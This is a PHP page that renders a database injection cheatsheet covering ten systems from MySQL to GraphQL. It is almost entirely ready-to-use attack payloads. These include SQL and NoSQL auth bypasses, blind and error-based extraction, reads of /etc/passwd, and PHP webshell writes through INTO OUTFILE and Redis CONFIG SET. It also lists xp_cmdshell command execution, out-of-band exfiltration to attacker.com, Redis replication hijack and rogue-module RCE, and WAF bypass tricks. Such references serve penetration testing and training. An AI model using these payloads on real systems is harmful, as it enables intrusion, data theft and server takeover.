<?php
require_once __DIR__ . '/../includes/config.php';
require_once __DIR__ . '/../includes/header.php';

$databases = [
    'mysql' => [
        'name'    => 'MySQL',
        'icon'    => 'MY',
        'version' => '8.0+',
        'docs'    => 'https://dev.mysql.com/doc/refman/8.0/en/',
        'color'   => 'mysql',
        'desc'    => 'The world\'s most popular open-source relational database. Powers the majority of web applications.',
        'sections' => [
            'String Concatenation' => "<code>'foo' 'bar'</code> (space-separated)\n<code>CONCAT('foo','bar')</code>\n<code>CONCAT_WS(',','a','b')</code>",
            'Comments' => "<code>-- comment</code> (note trailing space)\n<code># comment</code>\n<code>/* comment */</code>\n<code>/*! MySQL-specific */</code> (conditional comments)",
            'Version Detection' => "<code>SELECT VERSION()</code>\n<code>SELECT @@version</code>\n<code>/*!50000 SELECT 1*/</code> (executes only if version >= 5.0)",
            'Current Database' => "<code>SELECT database()</code>\n<code>SELECT schema()</code>",
            'Current User' => "<code>SELECT user()</code>\n<code>SELECT current_user()</code>\n<code>SELECT system_user()</code>",
            'List Databases' => "<code>SELECT schema_name FROM information_schema.schemata</code>",
            'List Tables' => "<code>SELECT table_name FROM information_schema.tables WHERE table_schema=database()</code>\n<code>SELECT table_name FROM information_schema.tables WHERE table_schema='dbname'</code>",
            'List Columns' => "<code>SELECT column_name FROM information_schema.columns WHERE table_name='users'</code>\n<code>DESCRIBE users</code>\n<code>SHOW COLUMNS FROM users</code>",
            'Error-Based Extraction' => "<code>EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))</code>\n<code>UPDATEXML(1, CONCAT(0x7e, (SELECT @@version)), 1)</code>\n<code>(SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</code>",
            'Time-Based Blind' => "<code>SLEEP(5)</code>\n<code>BENCHMARK(10000000, SHA1('test'))</code>\n<code>IF(condition, SLEEP(5), 0)</code>",
            'Stacked Queries' => "Supported via <code>mysqli_multi_query()</code>\n<code>; DROP TABLE users-- -</code>",
            'File Read' => "<code>LOAD_FILE('/etc/passwd')</code>\n<code>LOAD DATA INFILE '/etc/passwd' INTO TABLE tmp</code>",
            'File Write' => "<code>SELECT '&lt;?php system(\$_GET[\"c\"]);?&gt;' INTO OUTFILE '/var/www/shell.php'</code>\n<code>SELECT ... INTO DUMPFILE '/path/file'</code>",
            'Hostname / IP' => "<code>SELECT @@hostname</code>",
            'Useful Functions' => "<code>SUBSTRING(str, pos, len)</code>\n<code>ASCII(char)</code> / <code>ORD(char)</code>\n<code>CHAR(num)</code>\n<code>HEX(str)</code> / <code>UNHEX(hex)</code>\n<code>GROUP_CONCAT(col SEPARATOR ',')</code>\n<code>IFNULL(val, default)</code>",
            'WAF Bypass Tricks' => "<code>SeLeCt</code> (case variation)\n<code>SEL/**/ECT</code> (inline comments)\n<code>0x41424344</code> (hex-encoded strings)\n<code>CHAR(65,66,67)</code> (char-encoded)\n<code>%00</code> (null byte)\n<code>/*!UNION*/ /*!SELECT*/</code> (conditional comments)",
        ],
    ],
    'pgsql' => [
        'name'    => 'PostgreSQL',
        'icon'    => 'PG',
        'version' => '16+',
        'docs'    => 'https://www.postgresql.org/docs/current/',
        'color'   => 'pgsql',
        'desc'    => 'Advanced open-source RDBMS known for strict SQL compliance, rich type system, and extensibility.',
        'sections' => [
            'String Concatenation' => "<code>'foo' || 'bar'</code>\n<code>CONCAT('foo','bar')</code>",
            'Comments' => "<code>-- comment</code>\n<code>/* comment */</code>",
            'Version Detection' => "<code>SELECT version()</code>\n<code>SHOW server_version</code>",
            'Current Database' => "<code>SELECT current_database()</code>",
            'Current User' => "<code>SELECT current_user</code>\n<code>SELECT session_user</code>\n<code>SELECT user</code>",
            'List Databases' => "<code>SELECT datname FROM pg_database</code>",
            'List Tables' => "<code>SELECT table_name FROM information_schema.tables WHERE table_schema='public'</code>\n<code>SELECT tablename FROM pg_tables WHERE schemaname='public'</code>",
            'List Columns' => "<code>SELECT column_name FROM information_schema.columns WHERE table_name='users'</code>\n<code>SELECT attname FROM pg_attribute WHERE attrelid='users'::regclass AND attnum>0</code>",
            'Error-Based Extraction' => "<code>CAST((SELECT version()) AS INT)</code>\n<code>1/(SELECT 0 FROM (SELECT version())x)</code>",
            'Time-Based Blind' => "<code>pg_sleep(5)</code>\n<code>CASE WHEN (condition) THEN pg_sleep(5) ELSE pg_sleep(0) END</code>\n<code>(SELECT CASE WHEN condition THEN pg_sleep(5) END)</code>",
            'Stacked Queries' => "Fully supported\n<code>; CREATE TABLE pwned(data text)-- </code>",
            'File Read' => "<code>pg_read_file('/etc/passwd')</code> (superuser)\n<code>COPY tmp FROM '/etc/passwd'</code>\n<code>pg_read_binary_file('/path')</code>",
            'File Write' => "<code>COPY (SELECT 'payload') TO '/tmp/shell.php'</code>\n<code>lo_export(oid, '/path')</code>",
            'Command Execution' => "<code>COPY cmd_output FROM PROGRAM 'id'</code> (superuser)\n<code>CREATE FUNCTION exec(text) RETURNS text AS $$ ... $$ LANGUAGE plpythonu</code>",
            'Type Casting' => "<code>column::text</code>\n<code>CAST(column AS text)</code>\nStrict types: use casts in UNION",
            'Dollar Quoting' => "<code>$$string$$</code> or <code>$tag$string$tag$</code>\nBypasses single-quote filtering",
            'Useful Functions' => "<code>SUBSTRING(str FROM pos FOR len)</code>\n<code>ASCII(char)</code> / <code>CHR(num)</code>\n<code>LENGTH(str)</code>\n<code>STRING_AGG(col, ',')</code>\n<code>ENCODE(data, 'base64')</code>",
        ],
    ],
    'sqlite' => [
        'name'    => 'SQLite',
        'icon'    => 'SL',
        'version' => '3.x',
        'docs'    => 'https://www.sqlite.org/docs.html',
        'color'   => 'sqlite',
        'desc'    => 'Serverless, embedded SQL database engine. Used in mobile apps, browsers, IoT, and small web apps.',
        'sections' => [
            'String Concatenation' => "<code>'foo' || 'bar'</code>",
            'Comments' => "<code>-- comment</code>\n<code>/* comment */</code>",
            'Version Detection' => "<code>SELECT sqlite_version()</code>",
            'List Tables' => "<code>SELECT name FROM sqlite_master WHERE type='table'</code>\n<code>SELECT sql FROM sqlite_master WHERE type='table'</code> (shows CREATE statements)",
            'List Columns' => "<code>PRAGMA table_info('users')</code>\n<code>SELECT sql FROM sqlite_master WHERE name='users'</code>",
            'Error-Based Extraction' => "Limited. SQLite rarely exposes error details.\nUse UNION or blind techniques instead.",
            'Time-Based Blind' => "No built-in SLEEP(). Use heavy queries:\n<code>LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))</code>",
            'Stacked Queries' => "Not supported in most drivers (PHP sqlite3_query runs one statement).",
            'File Operations' => "<code>ATTACH DATABASE '/path/file.db' AS pwned</code>\nThen: <code>CREATE TABLE pwned.x(d text); INSERT INTO pwned.x VALUES('payload');</code>\nThe attached file is written to disk.",
            'Boolean Blind' => "<code>AND UNICODE(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>64</code>",
            'Data Types' => "Dynamically typed (type affinity). Any column can hold any type.\nNo strict type enforcement in UNION.",
            'Useful Functions' => "<code>SUBSTR(str, pos, len)</code>\n<code>UNICODE(char)</code> / <code>CHAR(num)</code>\n<code>LENGTH(str)</code>\n<code>HEX(str)</code>\n<code>TYPEOF(expr)</code>\n<code>REPLACE(str, from, to)</code>\n<code>GROUP_CONCAT(col, ',')</code>",
        ],
    ],
    'mssql' => [
        'name'    => 'MS SQL Server',
        'icon'    => 'MS',
        'version' => '2019 / 2022',
        'docs'    => 'https://learn.microsoft.com/en-us/sql/sql-server/',
        'color'   => 'mssql',
        'desc'    => 'Microsoft\'s enterprise relational database. Critical target in pentests due to xp_cmdshell and rich attack surface.',
        'sections' => [
            'String Concatenation' => "<code>'foo' + 'bar'</code>\n<code>CONCAT('foo','bar')</code>",
            'Comments' => "<code>-- comment</code>\n<code>/* comment */</code>",
            'Version Detection' => "<code>SELECT @@version</code>\n<code>SELECT SERVERPROPERTY('productversion')</code>",
            'Current Database' => "<code>SELECT DB_NAME()</code>\n<code>SELECT db_name()</code>",
            'Current User' => "<code>SELECT SYSTEM_USER</code>\n<code>SELECT USER_NAME()</code>\n<code>SELECT SUSER_SNAME()</code>\n<code>SELECT IS_SRVROLEMEMBER('sysadmin')</code>",
            'List Databases' => "<code>SELECT name FROM master..sysdatabases</code>\n<code>SELECT name FROM sys.databases</code>\n<code>EXEC sp_databases</code>",
            'List Tables' => "<code>SELECT table_name FROM information_schema.tables</code>\n<code>SELECT name FROM sysobjects WHERE xtype='U'</code>\n<code>SELECT name FROM sys.tables</code>",
            'List Columns' => "<code>SELECT column_name FROM information_schema.columns WHERE table_name='users'</code>\n<code>SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')</code>",
            'Error-Based Extraction' => "<code>CONVERT(INT, (SELECT @@version))</code>\n<code>CAST((SELECT TOP 1 password FROM users) AS INT)</code>\n<code>1 IN (SELECT TOP 1 password FROM users)</code>",
            'Time-Based Blind' => "<code>WAITFOR DELAY '0:0:5'</code>\n<code>IF(condition) WAITFOR DELAY '0:0:5'</code>",
            'Stacked Queries' => "Fully supported (one of MSSQL's most dangerous features)\n<code>; EXEC xp_cmdshell('whoami')-- </code>",
            'Command Execution' => "<code>EXEC xp_cmdshell 'whoami'</code>\nRe-enable: <code>EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE</code>\n<code>EXEC sp_OACreate 'wscript.shell', @o OUT; EXEC sp_OAMethod @o, 'run', null, 'cmd /c command'</code>",
            'File Read' => "<code>OPENROWSET(BULK 'C:\\file.txt', SINGLE_CLOB) AS x</code>\n<code>EXEC xp_cmdshell 'type C:\\file.txt'</code>",
            'File Write' => "<code>EXEC xp_cmdshell 'echo payload > C:\\path\\file.txt'</code>\n<code>bcp \"SELECT 'payload'\" queryout C:\\file.txt -c -T</code>",
            'Linked Servers' => "<code>SELECT * FROM OPENQUERY(linkedserver, 'SELECT 1')</code>\n<code>EXEC('xp_cmdshell ''whoami''') AT linkedserver</code>\n<code>SELECT * FROM master..sysservers</code>",
            'Useful Functions' => "<code>SUBSTRING(str, pos, len)</code>\n<code>ASCII(char)</code> / <code>CHAR(num)</code>\n<code>LEN(str)</code>\n<code>STUFF(str, pos, len, 'new')</code>\n<code>STRING_AGG(col, ',')</code> (2017+)",
        ],
    ],
    'oracle' => [
        'name'    => 'Oracle Database',
        'icon'    => 'OR',
        'version' => '21c / 23ai',
        'docs'    => 'https://docs.oracle.com/en/database/oracle/oracle-database/',
        'color'   => 'oracle',
        'desc'    => 'Enterprise RDBMS with unique SQL dialect. Requires FROM DUAL, different limit syntax, and specialized injection vectors.',
        'sections' => [
            'String Concatenation' => "<code>'foo' || 'bar'</code>\n<code>CONCAT('foo','bar')</code> (only 2 args)",
            'Comments' => "<code>-- comment</code>\n<code>/* comment */</code>",
            'Version Detection' => "<code>SELECT banner FROM v$version</code>\n<code>SELECT version FROM v$instance</code>\n<code>SELECT * FROM v$version WHERE banner LIKE 'Oracle%'</code>",
            'Current Database' => "<code>SELECT ora_database_name FROM dual</code>\n<code>SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual</code>",
            'Current User' => "<code>SELECT user FROM dual</code>\n<code>SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM dual</code>",
            'Required FROM clause' => "Every SELECT needs FROM.\n<code>SELECT 1 FROM DUAL</code> (DUAL is a dummy table)",
            'List Tables' => "<code>SELECT table_name FROM all_tables</code>\n<code>SELECT table_name FROM user_tables</code>\n<code>SELECT owner, table_name FROM all_tables WHERE owner='SCHEMA'</code>",
            'List Columns' => "<code>SELECT column_name FROM all_tab_columns WHERE table_name='USERS'</code>\n<code>SELECT column_name FROM user_tab_columns WHERE table_name='USERS'</code>\nNote: table/column names are UPPERCASE by default.",
            'Error-Based Extraction' => "<code>EXTRACTVALUE(XMLType('&lt;a>'||(SELECT user FROM dual)||'&lt;/a>'),'/a')</code>\n<code>UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))</code>\n<code>CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))</code>",
            'Time-Based Blind' => "<code>DBMS_PIPE.RECEIVE_MESSAGE('x',5)</code>\n<code>BEGIN DBMS_LOCK.SLEEP(5); END;</code>\n<code>SELECT CASE WHEN condition THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1 END FROM dual</code>",
            'Stacked Queries' => "Not supported via standard SQL injection (only in PL/SQL blocks).",
            'Out-of-Band (OOB)' => "<code>UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))</code>\n<code>HTTPURITYPE('http://attacker.com/'||data).GETCLOB()</code>\n<code>UTL_INADDR.GET_HOST_ADDRESS(data||'.attacker.com')</code>",
            'Row Limiting' => "<code>WHERE ROWNUM <= 1</code> (classic)\n<code>FETCH FIRST 1 ROWS ONLY</code> (12c+)\n<code>OFFSET 0 ROWS FETCH NEXT 5 ROWS ONLY</code>",
            'Useful Functions' => "<code>SUBSTR(str, pos, len)</code>\n<code>ASCII(char)</code> / <code>CHR(num)</code>\n<code>LENGTH(str)</code>\n<code>LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)</code>\n<code>RAWTOHEX(str)</code> / <code>HEXTORAW(hex)</code>",
        ],
    ],
    'mariadb' => [
        'name'    => 'MariaDB',
        'icon'    => 'MA',
        'version' => '11+',
        'docs'    => 'https://mariadb.com/kb/en/documentation/',
        'color'   => 'mariadb',
        'desc'    => 'MySQL-compatible fork with additional features like CONNECT engine, Oracle mode, sequences, and sys_exec UDF.',
        'sections' => [
            'String Concatenation' => "<code>CONCAT('foo','bar')</code>\n<code>CONCAT_WS(',','a','b')</code>\n<code>'foo' 'bar'</code> (space-separated)",
            'Comments' => "<code>-- comment</code>\n<code># comment</code>\n<code>/* comment */</code>\n<code>/*M! MariaDB-specific */</code>",
            'Version Detection' => "<code>SELECT VERSION()</code>\n<code>SELECT @@version</code>\nContains 'MariaDB' in version string",
            'MySQL Compatibility' => "Most MySQL injection techniques work identically.\nSame <code>information_schema</code> structure.\nSame error-based functions (EXTRACTVALUE, UPDATEXML).",
            'MariaDB-Specific Features' => "<code>EXECUTE IMMEDIATE 'SELECT ...'</code> (dynamic SQL)\n<code>CONNECT engine</code> (allows querying external files/databases)\n<code>CREATE SEQUENCE</code> (sequence objects)\nOracle PL/SQL compatibility mode",
            'CONNECT Engine Injection' => "If CONNECT engine is installed:\n<code>CREATE TABLE ext ENGINE=CONNECT TABLE_TYPE=MYSQL CONNECTION='mysql://user:pass@host/db'</code>\nAllows querying remote databases through MariaDB.",
            'List Tables' => "<code>SELECT table_name FROM information_schema.tables WHERE table_schema=database()</code>",
            'List Columns' => "<code>SELECT column_name FROM information_schema.columns WHERE table_name='users'</code>",
            'Error-Based Extraction' => "Same as MySQL:\n<code>EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))</code>\n<code>UPDATEXML(1, CONCAT(0x7e, (SELECT @@version)), 1)</code>",
            'Time-Based Blind' => "<code>SLEEP(5)</code>\n<code>BENCHMARK(10000000, SHA1('test'))</code>",
            'Stacked Queries' => "Supported via <code>mysqli_multi_query()</code>",
            'Useful Functions' => "Same as MySQL, plus:\n<code>COLUMN_JSON()</code>\n<code>COLUMN_CREATE()</code>\n<code>JSON_VALUE(json, path)</code>",
        ],
    ],
    'mongodb' => [
        'name'    => 'MongoDB',
        'icon'    => 'MG',
        'version' => '7+',
        'docs'    => 'https://www.mongodb.com/docs/manual/',
        'color'   => 'mongodb',
        'desc'    => 'Leading NoSQL document database. Injection targets query operators, server-side JS, and aggregation pipelines.',
        'sections' => [
            'Operator Injection' => 'PHP array injection in query parameters:
<code>username[$ne]=&amp;password[$ne]=</code> (bypass auth, not-equal to empty)
<code>username[$gt]=&amp;password[$gt]=</code> (greater-than empty)
<code>username[$regex]=^admin&amp;password[$ne]=</code> (regex match)',
            'Auth Bypass Patterns' => '<code>{"username": {"$ne": ""}, "password": {"$ne": ""}}</code>
<code>{"username": "admin", "password": {"$gt": ""}}</code>
<code>{"username": {"$in": ["admin","root"]}, "password": {"$ne": ""}}</code>',
            '$where / JS Injection' => '<code>{"$where": "this.password == \'x\' || 1==1"}</code>
<code>{"$where": "function(){return true}"}</code>
<code>\'; return true; var x=\'</code> (in $where string context)',
            '$regex Extraction' => 'Character-by-character data extraction:
<code>{"password": {"$regex": "^a"}}</code> (check if starts with \'a\')
<code>{"password": {"$regex": "^ab"}}</code> (check if starts with \'ab\')
Automate to extract full values.',
            'Aggregation Pipeline' => '<code>{"$lookup": {"from": "admin_users", "pipeline": [], "as": "leaked"}}</code>
Access other collections if pipeline injection is possible.',
            'Server Info' => '<code>db.adminCommand({buildInfo: 1})</code>
<code>db.adminCommand({serverStatus: 1})</code>',
            'List Collections' => '<code>db.getCollectionNames()</code>
<code>show collections</code> (shell)
Via injection: <code>{"$lookup": {"from": "system.namespaces", ...}}</code>',
            'JSON Injection' => 'If input is parsed as JSON:
<code>{"username": "admin", "password": {"$gt": ""}}</code>
Content-Type must be <code>application/json</code>',
            'Blind Extraction' => 'Use <code>$regex</code> for boolean blind.
Use heavy <code>$where</code> functions for time-based:
<code>{"$where": "if(this.password.match(/^a/)){sleep(5000)}"}</code>',
            'Common PHP Patterns' => '<code>$_GET[\'user\'][$ne]</code> (PHP auto-parses array syntax)
Payload: <code>?user[$ne]=&amp;pass[$ne]=</code>
Results in: <code>find({user:{$ne:\'\'}, pass:{$ne:\'\'}})</code>',
        ],
    ],
    'redis' => [
        'name'    => 'Redis',
        'icon'    => 'RD',
        'version' => '7+',
        'docs'    => 'https://redis.io/docs/',
        'color'   => 'redis',
        'desc'    => 'In-memory data structure store. Attack vectors include CRLF protocol injection, Lua scripting, and file write via CONFIG.',
        'sections' => [
            'CRLF Protocol Injection' => "Redis uses a text protocol separated by \\r\\n.\nIf user input is embedded in a Redis command:\n<code>value\\r\\nSET pwned injected\\r\\n</code>\nThe \\r\\n breaks the command boundary and injects new commands.",
            'CONFIG SET File Write' => "<code>CONFIG SET dir /var/www/html</code>\n<code>CONFIG SET dbfilename shell.php</code>\n<code>SET payload '&lt;?php system(\$_GET[\"c\"]);?&gt;'</code>\n<code>SAVE</code>\nWrites a PHP webshell (surrounded by Redis binary data).",
            'Lua Script Injection' => "<code>EVAL \"redis.call('SET','key',ARGV[1])\" 0 value</code>\nIf EVAL input is injectable:\n<code>EVAL \"return redis.call('CONFIG','SET','dir','/tmp')\" 0</code>",
            'Key Enumeration' => "<code>KEYS *</code> (slow on large datasets)\n<code>SCAN 0 MATCH * COUNT 100</code> (cursor-based, production-safe)\n<code>TYPE keyname</code>\n<code>GET keyname</code> (strings)\n<code>HGETALL keyname</code> (hashes)\n<code>LRANGE keyname 0 -1</code> (lists)",
            'SLAVEOF / REPLICAOF' => "<code>SLAVEOF attacker.com 6379</code>\nMakes this Redis a replica of attacker's server.\nAttacker receives full data copy.\n<code>REPLICAOF NO ONE</code> to stop.",
            'MODULE LOAD (RCE)' => "Via rogue Redis server (SLAVEOF):\n1. Victim does SLAVEOF to attacker\n2. Attacker sends malicious .so module\n3. <code>MODULE LOAD /tmp/evil.so</code>\n4. Module provides arbitrary command execution",
            'Info Gathering' => "<code>INFO server</code> (version, OS, config file path)\n<code>INFO keyspace</code> (databases and key counts)\n<code>CONFIG GET *</code> (all configuration)\n<code>CLIENT LIST</code> (connected clients)",
            'Auth Bypass' => "Default Redis has no auth (protected mode only blocks external).\n<code>AUTH password</code> (if password is weak/known)\nCheck <code>CONFIG GET requirepass</code>",
            'Dangerous Commands' => "<code>FLUSHALL</code> (delete all data in all databases)\n<code>FLUSHDB</code> (delete current database)\n<code>DEBUG SET-ACTIVE-EXPIRE 0</code>\n<code>SHUTDOWN</code> (stop the server)",
        ],
    ],
    'hql' => [
        'name'    => 'HQL (Hibernate)',
        'icon'    => 'HQ',
        'version' => 'Hibernate 6+ / JPA 3+',
        'docs'    => 'https://docs.jboss.org/hibernate/orm/current/userguide/html_single/Hibernate_User_Guide.html',
        'color'   => 'hql',
        'desc'    => 'Hibernate Query Language: object-oriented query language for Java ORM. More restricted than SQL but still injectable.',
        'sections' => [
            'HQL vs SQL' => "HQL uses <strong>Java class names</strong> instead of table names.\nHQL uses <strong>property names</strong> instead of column names.\n<code>FROM User u WHERE u.username = 'admin'</code> (not <code>FROM users</code>)\nNo UNION SELECT in standard HQL.\nNo stacked queries.",
            'Entity Discovery' => "Inject invalid entity names to trigger errors:\n<code>' OR 1=1 FROM InvalidEntity-- </code>\nError may list available entities.\nLook for CamelCase Java class names in error messages.",
            '.class Metadata' => "<code>entity.class</code> (returns the Java Class object)\n<code>entity.class.name</code> (fully qualified class name)\n<code>entity.class.simpleName</code> (short class name)\nUseful for discovering entity types and hierarchies.",
            'Boolean Injection' => "<code>' OR 1=1-- </code> (bypass WHERE clause)\n<code>' AND SUBSTRING(u.password,1,1)='a'-- </code>\nConditional extraction character by character.",
            'Error-Based' => "Force type conversion errors:\n<code>' AND CAST(u.password AS int)=1-- </code>\nHibernate translates to SQL CAST, error leaks the value.",
            'Native Query Escape' => "If app uses <code>createNativeQuery()</code> or <code>createSQLQuery()</code>:\nFull SQL injection is possible (UNION, stacked queries, etc.)\n<code>') UNION ALL SELECT password,null FROM users-- </code>",
            'Criteria API Injection' => "If app uses string concat in Criteria restrictions:\n<code>session.createCriteria(User.class).add(Restrictions.sqlRestriction(\"username='\" + input + \"'\"))</code>\nInject into the SQL fragment.",
            'JPQL Differences' => "JPA's JPQL is similar to HQL but more standardized.\n<code>SELECT u FROM User u WHERE u.name = :name</code>\nParameterized queries (<code>:name</code>) are safe.\nString concatenation is vulnerable.",
            'Key Limitations' => "No UNION (HQL doesn't support it)\nNo stacked queries\nNo direct table access (entities only)\nNo file read/write\nNo command execution\nLimited to data the ORM maps",
        ],
    ],
    'graphql' => [
        'name'    => 'GraphQL',
        'icon'    => 'GQ',
        'version' => 'API Specification',
        'docs'    => 'https://graphql.org/learn/',
        'color'   => 'graphql',
        'desc'    => 'API query language with built-in type system. Attacks target introspection, authorization, batching, and nested queries.',
        'sections' => [
            'Introspection (Schema Dump)' => "<code>{__schema{queryType{name} types{name kind fields{name type{name kind ofType{name}}}}}}</code>\n\nSimplified:\n<code>{__schema{types{name}}}</code> (list all types)\n<code>{__type(name:\"User\"){name fields{name type{name}}}}</code> (inspect a type)",
            'Field Suggestion Exploit' => "When introspection is disabled, query invalid fields:\n<code>{users{passwrd}}</code>\nServer responds: <em>\"Did you mean 'password'?\"</em>\nAutomate with wordlists to reconstruct schema.",
            'Auth Bypass via Aliases' => "Aliases let you query the same field multiple ways:\n<code>{public:user(id:1){name} secret:user(id:1){password ssn}}</code>\nIf authorization checks are per-query (not per-field), sensitive fields leak.",
            'Batch / Alias Brute-Force' => "Single request, many operations:\n<code>{a:login(pass:\"000\"){token} b:login(pass:\"001\"){token} c:login(pass:\"002\"){token}}</code>\nBypasses per-request rate limiting.\nEffective for OTP bypass, password brute-force.",
            'Nested Query DoS' => "Exploit circular type references:\n<code>{users{posts{author{posts{author{posts{author{name}}}}}}}}</code>\nExponential resolver calls without depth limits.\nCan crash or slow down the server.",
            'Mutation Abuse' => "<code>mutation{updateUser(id:1, role:\"admin\"){id role}}</code>\n<code>mutation{deleteUser(id:2){id}}</code>\nTest mutations for missing authorization checks.",
            'Fragment Injection' => "<code>query{users{...UserFields}} fragment UserFields on User{id name password}</code>\nFragments can request fields the original query wasn't meant to expose.",
            'Common Endpoints' => "<code>/graphql</code>\n<code>/api/graphql</code>\n<code>/v1/graphql</code>\n<code>/graphql/console</code>\n<code>/graphiql</code> (interactive IDE)",
            'Useful Tools' => "<strong>InQL</strong>: Burp Suite extension for GraphQL testing\n<strong>GraphQL Voyager</strong>: schema visualization\n<strong>Altair</strong>: GraphQL client\n<strong>graphql-path-enum</strong>: find paths between types\n<strong>BatchQL</strong>: batching attack tool",
            'Detection' => "Send: <code>{\"query\":\"{__typename}\"}</code>\nIf response contains <code>{\"data\":{\"__typename\":\"Query\"}}</code>, it's GraphQL.\nAlso try GET: <code>/graphql?query={__typename}</code>",
        ],
    ],
];
?>

<style>
.cs-grid {
    display: grid;
    grid-template-columns: 1fr;
    gap: 24px;
}
.cs-card {
    background: var(--bg-card);
    border: 1px solid var(--line);
    border-radius: 10px;
    overflow: hidden;
}
.cs-card-head {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 16px 20px;
    border-bottom: 1px solid var(--line);
    cursor: pointer;
    user-select: none;
    transition: background 0.2s;
}
.cs-card-head:hover {
    background: var(--bg-card-hover);
}
.cs-card-id {
    display: flex;
    align-items: center;
    gap: 12px;
}
.cs-card-icon {
    width: 40px;
    height: 40px;
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: var(--font-mono);
    font-weight: 700;
    font-size: 15px;
}
.cs-card-name {
    font-weight: 700;
    font-size: 17px;
}
.cs-card-ver {
    font-family: var(--font-mono);
    font-size: 11px;
    color: var(--text-2);
}
.cs-card-desc {
    font-size: 13px;
    color: var(--text-2);
    margin-top: 2px;
}
.cs-card-right {
    display: flex;
    align-items: center;
    gap: 10px;
}
.cs-docs-btn {
    font-family: var(--font-mono);
    font-size: 10px;
    padding: 4px 10px;
    border-radius: 4px;
    background: var(--neon-dim);
    color: var(--neon);
    text-decoration: none;
    border: 1px solid var(--neon);
    white-space: nowrap;
    transition: background 0.2s;
}
.cs-docs-btn:hover {
    background: var(--neon);
    color: var(--bg-0);
}
.cs-toggle {
    font-family: var(--font-mono);
    font-size: 18px;
    color: var(--text-2);
    transition: transform 0.3s;
    width: 24px;
    text-align: center;
}
.cs-card.open .cs-toggle {
    transform: rotate(90deg);
}
.cs-card-body {
    display: none;
    padding: 0 20px 20px;
}
.cs-card.open .cs-card-body {
    display: block;
}
.cs-section {
    margin-top: 16px;
}
.cs-section-label {
    font-family: var(--font-mono);
    font-size: 11px;
    font-weight: 600;
    color: var(--neon);
    text-transform: uppercase;
    letter-spacing: 0.5px;
    margin-bottom: 6px;
}
.cs-section-content {
    background: var(--bg-input);
    border: 1px solid var(--line);
    border-radius: 6px;
    padding: 10px 14px;
    font-family: var(--font-mono);
    font-size: 12px;
    line-height: 1.7;
    white-space: pre-wrap;
    word-break: break-word;
    color: var(--text-0);
}
.cs-section-content code {
    background: rgba(0,255,170,0.08);
    padding: 1px 5px;
    border-radius: 3px;
    color: var(--neon);
    font-size: 12px;
}
.cs-section-content strong {
    color: var(--text-0);
}
.cs-toc {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    margin-bottom: 24px;
}
.cs-toc-btn {
    font-family: var(--font-mono);
    font-size: 11px;
    padding: 5px 12px;
    border-radius: 5px;
    border: 1px solid var(--line);
    background: var(--bg-card);
    color: var(--text-2);
    text-decoration: none;
    transition: all 0.2s;
    display: flex;
    align-items: center;
    gap: 6px;
}
.cs-toc-btn:hover {
    border-color: var(--neon);
    color: var(--neon);
}
.cs-toc-icon {
    font-weight: 700;
    font-size: 10px;
}
</style>

<div class="container">

    <section class="hero anim" style="padding:36px 0 20px;">
        <div class="hero-eyebrow">
            <span class="dot"></span>
            database injection cheatsheet
        </div>
        <h1>SQL Injection <span class="hl">Cheatsheet</span></h1>
        <p class="hero-sub">
            Quick-reference syntax, injection payloads, and enumeration commands for all 10 target databases.
            Each section links to official documentation. Click a database to expand.
        </p>
    </section>

    <!-- Quick Jump -->
    <div class="cs-toc anim anim-d1">
        <?php foreach ($databases as $key => $db): ?>
            <a href="#cs-<?= $key ?>" class="cs-toc-btn" onclick="openCard('cs-<?= $key ?>')">
                <span class="cs-toc-icon"><?= htmlspecialchars($db['icon']) ?></span>
                <?= htmlspecialchars($db['name']) ?>
            </a>
        <?php endforeach; ?>
    </div>

    <!-- Database Cards -->
    <div class="cs-grid anim anim-d1">
        <?php foreach ($databases as $key => $db): ?>
            <div class="cs-card" id="cs-<?= $key ?>">
                <div class="cs-card-head" onclick="toggleCard(this)">
                    <div class="cs-card-id">
                        <div class="cs-card-icon" style="color:var(--<?= $db['color'] ?>);background:var(--<?= $db['color'] ?>-g);"><?= htmlspecialchars($db['icon']) ?></div>
                        <div>
                            <div class="cs-card-name"><?= htmlspecialchars($db['name']) ?></div>
                            <div class="cs-card-desc"><?= htmlspecialchars($db['desc']) ?></div>
                        </div>
                    </div>
                    <div class="cs-card-right">
                        <span class="cs-card-ver"><?= htmlspecialchars($db['version']) ?></span>
                        <a href="<?= htmlspecialchars($db['docs']) ?>" target="_blank" rel="noopener" class="cs-docs-btn" onclick="event.stopPropagation();">DOCS</a>
                        <span class="cs-toggle">&#9656;</span>
                    </div>
                </div>
                <div class="cs-card-body">
                    <?php foreach ($db['sections'] as $label => $content): ?>
                        <div class="cs-section">
                            <div class="cs-section-label">// <?= htmlspecialchars($label) ?></div>
                            <div class="cs-section-content"><?= $content ?></div>
                        </div>
                    <?php endforeach; ?>
                    <div class="cs-section" style="margin-top:20px;padding-top:12px;border-top:1px solid var(--line);">
                        <a href="<?= htmlspecialchars($db['docs']) ?>" target="_blank" rel="noopener" style="font-family:var(--font-mono);font-size:12px;color:var(--neon);text-decoration:none;">
                            Official Documentation &rarr; <?= htmlspecialchars($db['docs']) ?>
                        </a>
                    </div>
                </div>
            </div>
        <?php endforeach; ?>
    </div>

</div>

<script>
function toggleCard(header) {
    header.closest('.cs-card').classList.toggle('open');
}
function openCard(id) {
    var card = document.getElementById(id);
    if (card && !card.classList.contains('open')) {
        card.classList.add('open');
    }
}
// Open card if URL hash matches
(function() {
    var hash = window.location.hash;
    if (hash && hash.startsWith('#cs-')) {
        var card = document.querySelector(hash);
        if (card) card.classList.add('open');
    }
})();
</script>

<?php require_once __DIR__ . '/../includes/footer.php'; ?>
